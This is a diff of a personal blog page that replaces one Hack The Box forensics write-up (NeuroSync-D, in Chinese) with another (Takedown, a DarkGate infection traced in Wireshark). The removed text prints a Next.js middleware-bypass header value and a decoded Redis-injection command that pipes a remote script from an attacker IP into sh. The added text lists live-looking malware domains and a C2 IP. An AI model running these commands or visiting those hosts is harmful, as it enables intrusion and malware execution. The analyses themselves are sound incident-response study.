@@ -8,7 +8,7 @@
   name="viewport"
   content="width=device-width, initial-scale=1, shrink-to-fit=no"
 /><title>
-  HTB-NeuroSync D | Wuvoun
+  HTB-Takedown | Wuvoun
 </title>
 <meta
   name="description"
@@ -37,12 +37,12 @@
     crossorigin="anonymous"
   /><link rel="stylesheet" href="/css/loader.min.ac746e154f756f8220326eeb52a719f142ab038be5a8ddf30ea5ef15ef2356ea.css" />
 <meta property="og:type" content="website" />
-  <meta property="og:title" content="HTB-NeuroSync D | Wuvoun" />
+  <meta property="og:title" content="HTB-Takedown | Wuvoun" />
   <meta
     property="og:description"
     content="少女祈祷中..."
   />
-  <meta property="og:url" content="https://wuvoun.github.io/post/neurosync-d/" />
+  <meta property="og:url" content="https://wuvoun.github.io/post/htb-takedown/" />
   <meta
     property="og:site_name"
     content="Wuvoun"
@@ -52,8 +52,8 @@
     content="/"
   />
   <meta property="article:author" content="Wuvoun" />
-  <meta property="article:published_time" content="2025-09-09T02:27:06&#43;08:00" />
-  <meta property="article:modified_time" content="2025-09-09T02:27:06&#43;08:00" /><meta property="article:tag" content="DFIR" /><meta name="twitter:card" content="summary" />
+  <meta property="article:published_time" content="2025-09-18T02:57:45&#43;08:00" />
+  <meta property="article:modified_time" content="2025-09-18T02:57:45&#43;08:00" /><meta property="article:tag" content="SOC" /><meta name="twitter:card" content="summary" />
   <meta name="twitter:image" content="/" />
 <link rel="shortcut icon" href="/favicon1.ico"><link rel="stylesheet" href="/css/main.min.5a853f279b790b623408299f44544bf0b98ef360d87a9d68d6dcd3848c735f90.css" />
 <link
@@ -126,9 +126,9 @@ This article does not have a corresponding language version
       </span><a id="main-nav-toggle" class="nav-icon"></a>
   </nav>
   <nav id="sub-nav"></nav></div>
-<header id="header"><picture></picture><img  fetchpriority="high" src="/images/banner.png" alt="HTB-NeuroSync D"><div id="header-outer">
+<header id="header"><picture></picture><img  fetchpriority="high" src="/images/banner.png" alt="HTB-Takedown"><div id="header-outer">
     <div id="header-title"><a href="/" id="logo">
-            <h1 data-aos="slide-up">HTB-NeuroSync D</h1>
+            <h1 data-aos="slide-up">HTB-Takedown</h1>
           </a><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
   </div>
 </header><div id="content"
@@ -140,7 +140,25 @@ This article does not have a corresponding language version
     ><div class="sidebar-toc-sidebar"><div class="sidebar-toc">
   <h3 class="toc-title">Contents</h3>
   <div class="sidebar-toc-wrapper toc-div-class">
-    <nav id="TableOfContents"></nav>
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#1-from-what-domain-is-the-vbs-script-downloaded">1. <strong>From what domain is the VBS script downloaded?</strong></a></li>
+        <li><a href="#2-what-was-the-ip-address-associated-with-the-domain-in-question-1-used-for-this-attack">2. <strong>What was the IP address associated with the domain in question #1 used for this attack?</strong></a></li>
+        <li><a href="#3-what-is-the-filename-of-the-vbs-script-used-for-initial-access">3. <strong>What is the filename of the VBS script used for initial access?</strong></a></li>
+        <li><a href="#4-what-was-the-url-used-to-get-a-powershell-script">4. <strong>What was the URL used to get a PowerShell script?</strong></a></li>
+        <li><a href="#5-what-likely-legit-binary-was-downloaded-to-the-victim-machine">5. <strong>What likely legit binary was downloaded to the victim machine?</strong></a></li>
+        <li><a href="#6-from-what-url-was-the-malware-used-with-the-binary-from-question-5-downloaded">6. <strong>From what URL was the malware used with the binary from question #5 downloaded?</strong></a></li>
+        <li><a href="#7-what-filename-was-the-malware-from-question-6-given-on-disk">7. <strong>What filename was the malware from question #6 given on disk?</strong></a></li>
+        <li><a href="#8-what-is-the-tlsh-of-the-malware">8. <strong>What is the TLSH of the malware?</strong></a></li>
+        <li><a href="#9-what-is-the-name-given-to-this-malware-use-the-name-used-by-mcafee-ikarus-and-alejandrosanchez">9. <strong>What is the name given to this malware? Use the name used by McAfee, Ikarus, and alejandro.sanchez.</strong></a></li>
+        <li><a href="#10-what-is-the-user-agent-string-of-the-infected-machine">10. <strong>What is the user-agent string of the infected machine?</strong></a></li>
+        <li><a href="#11-to-what-ip-does-the-rat-from-the-previous-question-connect">11. <strong>To what IP does the RAT from the previous question connect?</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
   </div>
 </div></div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -216,11 +234,11 @@ This article does not have a corresponding language version
     class="article-date-link"
     data-aos="zoom-in"
   >
-    <time datetime="2025-09-09 02:27:06 &#43;0800 CST" itemprop="datePublished"
-      >2025-09-09</time
+    <time datetime="2025-09-18 02:57:45 &#43;0800 CST" itemprop="datePublished"
+      >2025-09-18</time
     >
     <time style="display: none;" id="post-update-time"
-      >2025-09-09</time
+      >2025-09-18</time
     >
   </span>
 </div>
@@ -231,121 +249,74 @@ This article does not have a corresponding language version
       >HTB</a
     ></div>
 </div>
-    <div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h1 id="htb-neurosync-d">
-<a class="header-anchor" href="#htb-neurosync-d"></a>
-HTB-NeuroSync-D
-</h1><p>题目给出下列日志：</p>
-<ul>
-<li><strong>access.log</strong>
-<ul>
-<li>一般是 Web 服务器（Nginx/Apache）或网关的访问日志。</li>
-<li>记录请求 IP、时间、URL、状态码、UA。</li>
-</ul>
-</li>
-<li><strong>bci-device.log</strong>
-<ul>
-<li>可能和系统里的某个 <strong>BCI（Brain-Computer Interface）设备</strong> 或类似命名的模块相关。</li>
-<li>常见用途：设备状态、连接信息、错误上报。</li>
-</ul>
-</li>
-<li><strong>data-api.log</strong>
-<ul>
-<li>通常是后端的数据接口服务日志。</li>
-<li>可能包含 API 请求参数、响应、异常堆栈。</li>
-<li>常用于调试接口调用和数据交互问题。</li>
-</ul>
-</li>
-<li><strong>interface.log</strong>
-<ul>
-<li>Next.js 开发服务器 (<code>next dev</code>) 的运行日志</li>
-</ul>
-</li>
-<li><strong>redis.log</strong>
-<ul>
-<li>Redis 数据库的运行日志。</li>
-<li>一般包含启动信息、持久化状态、错误（比如连接异常、内存不足、RDB/AOF 保存情况）。</li>
-</ul>
-</li>
-</ul>
-<ol>
-<li><strong>What version of Next.js is the application using?</strong></li>
-</ol>
-<p>查看 <strong><code>interface.log</code>日志，可以知道Next.js 15.1.0</strong></p>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image.4jogeg4ij3.png" alt="image.png"></p>
-<ol start="2">
-<li><strong>What local port is the Next.js-based application running on?</strong></li>
-</ol>
-<p>上一题的截图中显示了程序运行在3000端口</p>
-<ol start="3">
-<li><strong>A critical Next.js vulnerability was released in March 2025, and this version appears to be affected. What is the CVE identifier for this vulnerability?</strong></li>
-</ol>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-1.8ok1qk1olf.png" alt="image.png"></p>
-<ol start="4">
-<li><strong>The attacker tried to enumerate some static files that are typically available in the Next.js framework, most likely to retrieve its version. What is the first file he could get?</strong></li>
-</ol>
-<p>查看 <code>access.log</code> 查找请求成功的文件，发现为 <code>/_next/static/chunks/main-app.js</code>  答案为<code>main-app.js</code></p>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-2.4g4ugqbft0.png" alt="image.png"></p>
-<ol start="5">
-<li><strong>Then the attacker appears to have found an endpoint that is potentially affected by the previously identified vulnerability. What is that endpoint?</strong></li>
-</ol>
-<p>查找日志中的 401响应，发现 <code>/api/bci/analytics</code>  一开始没有权限，然后表明可能成功绕过认证，接口确实受漏洞影响。</p>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-3.7i0qhycs06.png" alt="image.png"></p>
-<ol start="6">
-<li><strong>How many requests to this endpoint have resulted in an &ldquo;Unauthorized&rdquo; response?</strong></li>
-</ol>
-<p>全局搜索 <code>401</code> 发现就上图的 <code>5</code> 个未授权响应</p>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-4.esv2c7cg7.png" alt="image.png"></p>
-<ol start="7">
-<li><strong>When is a successful response received from the vulnerable endpoint, meaning that the middleware has been bypassed?</strong></li>
-</ol>
-<p>由上图可知从<code>2025-04-01 11:38:05</code> 开始接受，响应码为200</p>
-<ol start="8">
-<li><strong>Given the previous failed requests, what will most likely be the final value for the vulnerable header used to exploit the vulnerability and bypass the middleware?</strong></li>
-</ol>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-5.70aotdbefc.png" alt="image.png"></p>
-<p>从<strong>interface.log可以看出， 进行4 次尝试试图利用此漏洞，第5次成功，所以易受攻击的标头的最终值为</strong>
-<code>x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware</code></p>
-<ol start="9">
-<li><strong>The attacker chained the vulnerability with an SSRF attack, which allowed them to perform an internal port scan and discover an internal API. On which port is the API accessible?</strong></li>
-</ol>
-<p>查看<strong>data-api.log 日志，从漏洞利用成功开始</strong><code>2025-04-01 11:38:05</code>，发现攻击者使用 curl 触发 SSRF 漏洞并在端口 4000 上发现另一个内部 API</p>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-6.8z6vjpgwqx.png" alt="image.png"></p>
-<ol start="10">
-<li><strong>After the port scan, the attacker starts a brute-force attack to find some vulnerable endpoints in the previously identified API. Which vulnerable endpoint was found?</strong></li>
-</ol>
-<p>在<strong>data-api.log 日志后面找到爆破的记录，找到 <code>/logs</code> 易受攻击的端点</strong></p>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-7.8s3no9urbg.png" alt="image.png"></p>
-<ol start="11">
-<li><strong>When the vulnerable endpoint found was used maliciously for the first time?</strong></li>
-</ol>
-<p>从上图可知，攻击者利用这个端口进行本地文件包含漏洞，时间为 <code>*2025-04-01* *11:39:01*</code></p>
-<ol start="12">
-<li><strong>What is the attack name the endpoint is vulnerable to?</strong></li>
-</ol>
-<p>这个攻击的名称为<code>Local File Inclusion</code></p>
-<ol start="13">
-<li><strong>What is the name of the file that was targeted the last time the vulnerable endpoint was exploited?</strong></li>
-</ol>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-8.13m4mcuvgt.png" alt="image.png"></p>
-<p>从图可知，最后获得的文件为 <code>secret.key</code></p>
-<ol start="14">
-<li><strong>Finally, the attacker uses the sensitive information obtained earlier to create a special command that allows them to perform Redis injection and gain RCE on the system. What is the command string?</strong></li>
-</ol>
-<p>查看 <strong><code>redis.log</code> 日志,查看最后的指令，发现的rce指令</strong></p>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-9.szat7fnbh.png" alt="image.png"></p>
-<ol start="15">
-<li><strong>Once decoded, what is the command?</strong></li>
-</ol>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-10.7aximiqmku.png" alt="image.png"></p>
-<p>解密后得到指令</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://185.202.2.147/h4Pln4/run.sh -O- | sh
-</span></span></code></pre></div></div>
+    <div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h1 id="htb-takedown">
+<a class="header-anchor" href="#htb-takedown"></a>
+HTB-Takedown
+</h1><h3 id="1-from-what-domain-is-the-vbs-script-downloaded">
+<a class="header-anchor" href="#1-from-what-domain-is-the-vbs-script-downloaded"></a>
+1. <strong>From what domain is the VBS script downloaded?</strong>
+</h3><p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image.5xazvcwen8.webp" alt="image.png"></p>
+<p>从导出可以看到，从 <a href="http://escuelademarina.com/"><code>escuelademarina.com</code></a> 下载了两个vbs文件</p>
+<h3 id="2-what-was-the-ip-address-associated-with-the-domain-in-question-1-used-for-this-attack">
+<a class="header-anchor" href="#2-what-was-the-ip-address-associated-with-the-domain-in-question-1-used-for-this-attack"></a>
+2. <strong>What was the IP address associated with the domain in question #1 used for this attack?</strong>
+</h3><p>点击这个文件，会直接跳到这个流量，会发现IP为 <code>165.22.16.55</code></p>
+<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-1.8admcka7tq.webp" alt="image.png"></p>
+<h3 id="3-what-is-the-filename-of-the-vbs-script-used-for-initial-access">
+<a class="header-anchor" href="#3-what-is-the-filename-of-the-vbs-script-used-for-initial-access"></a>
+3. <strong>What is the filename of the VBS script used for initial access?</strong>
+</h3><p>由上图可以知道文件名为 <code>AZURE_DOC_OPEN.vbs</code></p>
+<h3 id="4-what-was-the-url-used-to-get-a-powershell-script">
+<a class="header-anchor" href="#4-what-was-the-url-used-to-get-a-powershell-script"></a>
+4. <strong>What was the URL used to get a PowerShell script?</strong>
+</h3><p>下载vbs, 查看其中的内容</p>
+<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-2.7snknz8u8v.webp" alt="image.png"></p>
+<p>url为 <a href="http://badbutperfect.com/nrwncpwo"><code>badbutperfect.com/nrwncpwo</code></a></p>
+<h3 id="5-what-likely-legit-binary-was-downloaded-to-the-victim-machine">
+<a class="header-anchor" href="#5-what-likely-legit-binary-was-downloaded-to-the-victim-machine"></a>
+5. <strong>What likely legit binary was downloaded to the victim machine?</strong>
+</h3><p>将 <code>nrwncpwo</code> 上传云杀箱检查</p>
+<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-3.1vz0gysba8.webp" alt="image.png"></p>
+<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-4.6t7hat6335.webp" alt="image.png"></p>
+<p>通过google搜索，合法的二进制文件为 <code>AutoHotKey.exe</code></p>
+<h3 id="6-from-what-url-was-the-malware-used-with-the-binary-from-question-5-downloaded">
+<a class="header-anchor" href="#6-from-what-url-was-the-malware-used-with-the-binary-from-question-5-downloaded"></a>
+6. <strong>From what URL was the malware used with the binary from question #5 downloaded?</strong>
+</h3><p>打开这个<code>nrwncpwo</code>  文件，发现 <code>script.ahk</code> 是从 <a href="http://badbutperfect.com/jvtobaqj"><code>http://badbutperfect.com/jvtobaqj</code></a>  下载的</p>
+<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-5.9kgjivs74y.webp" alt="image.png"></p>
+<h3 id="7-what-filename-was-the-malware-from-question-6-given-on-disk">
+<a class="header-anchor" href="#7-what-filename-was-the-malware-from-question-6-given-on-disk"></a>
+7. <strong>What filename was the malware from question #6 given on disk?</strong>
+</h3><p>由上题可知 ， 文件名为 <code>script.ahk</code></p>
+<h3 id="8-what-is-the-tlsh-of-the-malware">
+<a class="header-anchor" href="#8-what-is-the-tlsh-of-the-malware"></a>
+8. <strong>What is the TLSH of the malware?</strong>
+</h3><p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-6.5j4k4ho3s3.webp" alt="image.png"></p>
+<p>由图可知 ，TLSH 为 <code>T15E430A36DBC5202AD8E3074270096562FE7DC0215B4B32659C9EF16835CF6FF9B6A1B8</code></p>
+<h3 id="9-what-is-the-name-given-to-this-malware-use-the-name-used-by-mcafee-ikarus-and-alejandrosanchez">
+<a class="header-anchor" href="#9-what-is-the-name-given-to-this-malware-use-the-name-used-by-mcafee-ikarus-and-alejandrosanchez"></a>
+9. <strong>What is the name given to this malware? Use the name used by McAfee, Ikarus, and alejandro.sanchez.</strong>
+</h3><p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-7.b99hhv3tv.webp" alt="image.png"></p>
+<p>恶意软件名为 <code>DarkGate</code></p>
+<h3 id="10-what-is-the-user-agent-string-of-the-infected-machine">
+<a class="header-anchor" href="#10-what-is-the-user-agent-string-of-the-infected-machine"></a>
+10. <strong>What is the user-agent string of the infected machine?</strong>
+</h3><p>wireshark过滤</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ip.addr <span style="color:#f92672">==</span> 10.3.19.101 and http
+</span></span></code></pre></div><p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-8.8vn9yv4o4k.webp" alt="image.png"></p>
+<p>找到UA头</p>
+<p><code>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36</code></p>
+<h3 id="11-to-what-ip-does-the-rat-from-the-previous-question-connect">
+<a class="header-anchor" href="#11-to-what-ip-does-the-rat-from-the-previous-question-connect"></a>
+11. <strong>To what IP does the RAT from the previous question connect?</strong>
+</h3><p>由上图可知 IP为 <code>103.124.105.78</code></p>
+</div>
     <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
       <a
         class="article-tag-list-link"
-        href="/tags/dfir"
+        href="/tags/soc"
         rel="tag"
-        >DFIR</a
+        >SOC</a
       >
     </li></ul>
 </footer>
@@ -353,21 +324,13 @@ HTB-NeuroSync-D
     id="article-nav"
     data-aos="fade-up"
   ><div class="article-nav-link-wrap article-nav-link-left"><img
-              data-src="images/b.jpg"
+              data-src="images/a.jpg"
               data-sizes="auto"
-              alt="AD攻击取证"
+              alt="HTB Compromised"
               class="lazyload"
-            /><a href="/post/ad%E6%94%BB%E5%87%BB%E5%8F%96%E8%AF%81/"></a>
+            /><a href="/post/htb-compromised/"></a>
         <div class="article-nav-caption">Prev</div>
-        <h3 class="article-nav-title">AD攻击取证</h3>
-      </div><div class="article-nav-link-wrap article-nav-link-right"><img
-              data-src="images/c.jpg"
-              data-sizes="auto"
-              alt="HTB Pikaptcha"
-              class="lazyload"
-            /><a href="/post/htb-pikaptcha/"></a>
-        <div class="article-nav-caption">Next</div>
-        <h3 class="article-nav-title">HTB Pikaptcha</h3>
+        <h3 class="article-nav-title">HTB Compromised</h3>
       </div></nav></article></section>
         </div><footer id="footer">
   <div style="width: 100%; overflow: hidden">
@@ -416,7 +379,25 @@ HTB-NeuroSync-D
   <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><div class="sidebar-toc">
   <h3 class="toc-title">Contents</h3>
   <div class="sidebar-toc-wrapper toc-div-class">
-    <nav id="TableOfContents"></nav>
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#1-from-what-domain-is-the-vbs-script-downloaded">1. <strong>From what domain is the VBS script downloaded?</strong></a></li>
+        <li><a href="#2-what-was-the-ip-address-associated-with-the-domain-in-question-1-used-for-this-attack">2. <strong>What was the IP address associated with the domain in question #1 used for this attack?</strong></a></li>
+        <li><a href="#3-what-is-the-filename-of-the-vbs-script-used-for-initial-access">3. <strong>What is the filename of the VBS script used for initial access?</strong></a></li>
+        <li><a href="#4-what-was-the-url-used-to-get-a-powershell-script">4. <strong>What was the URL used to get a PowerShell script?</strong></a></li>
+        <li><a href="#5-what-likely-legit-binary-was-downloaded-to-the-victim-machine">5. <strong>What likely legit binary was downloaded to the victim machine?</strong></a></li>
+        <li><a href="#6-from-what-url-was-the-malware-used-with-the-binary-from-question-5-downloaded">6. <strong>From what URL was the malware used with the binary from question #5 downloaded?</strong></a></li>
+        <li><a href="#7-what-filename-was-the-malware-from-question-6-given-on-disk">7. <strong>What filename was the malware from question #6 given on disk?</strong></a></li>
+        <li><a href="#8-what-is-the-tlsh-of-the-malware">8. <strong>What is the TLSH of the malware?</strong></a></li>
+        <li><a href="#9-what-is-the-name-given-to-this-malware-use-the-name-used-by-mcafee-ikarus-and-alejandrosanchez">9. <strong>What is the name given to this malware? Use the name used by McAfee, Ikarus, and alejandro.sanchez.</strong></a></li>
+        <li><a href="#10-what-is-the-user-agent-string-of-the-infected-machine">10. <strong>What is the user-agent string of the infected machine?</strong></a></li>
+        <li><a href="#11-to-what-ip-does-the-rat-from-the-previous-question-connect">11. <strong>To what IP does the RAT from the previous question connect?</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
   </div>
 </div></div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -507,9 +488,9 @@ HTB-NeuroSync-D
   <div><script data-pjax>
         window.REIMU_POST = {
           author: "Wuvoun",
-          title: "HTB-NeuroSync D",
-          url: "https:\/\/wuvoun.github.io\/post\/neurosync-d\/",
-          description: "\rHTB-NeuroSync-D\r题目给出下列日志：\naccess.log 一般是 Web 服务器（Nginx\/Apache）或网关的访问日志。 记录请求 IP、时间、URL、状态码、UA。 bci-device.log 可能和系统里的某个 BCI（Brain-Computer Interface）设备 或类似命名的模块相关。 常见用途：设备状态、连接信息、错误上报。 data-api.log 通常是后端的数据接口服务日志。 可能包含 API 请求参数、响应、异常堆栈。 常用于调试接口调用和数据交互问题。 interface.log Next.js 开发服务器 (next dev) …",
+          title: "HTB-Takedown",
+          url: "https:\/\/wuvoun.github.io\/post\/htb-takedown\/",
+          description: "\rHTB-Takedown\r1. From what domain is the VBS script downloaded?\r从导出可以看到，从 escuelademarina.com 下载了两个vbs文件\n2. What was the IP address associated with the domain in question #1 used for this attack?\r点击这个文件，会直接跳到这个流量，会发现IP为 165.22.16.55\n3. What is the filename of the VBS script used for initial access?\r …",
           cover: "https:\/\/wuvoun.github.io\/images\/banner.png",
         };
       </script><script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const pswp = () => {
